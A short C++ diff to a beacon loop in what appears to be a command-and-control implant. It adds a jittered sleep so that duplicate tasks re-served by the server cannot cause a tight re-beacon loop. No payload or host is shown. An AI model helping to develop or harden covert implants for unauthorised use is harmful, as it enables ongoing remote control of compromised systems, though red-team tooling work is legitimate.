@@ -2456,7 +2456,15 @@ DWORD BeaconLoop(const Session& session) {
                 if (result.size() > cap)
                     result.resize(cap);
                 SendResult(session.sessionId, tid, status, result);
-                // Re-beacon immediately after a task — no sleep, pick up next command fast
+                if (dup) {
+                    // The server re-served a task we already ran. Never hot-loop on
+                    // a duplicate: fall back to the normal beacon cadence so a stuck
+                    // task cannot become a process storm (the previous unconditional
+                    // immediate re-beacon turned every re-serve into a tight loop).
+                    JitterSleep(config::BEACON_MIN, config::BEACON_MAX);
+                }
+                // Re-beacon immediately after a fresh task — no sleep, pick up the
+                // next command fast.
                 continue;
             }
 
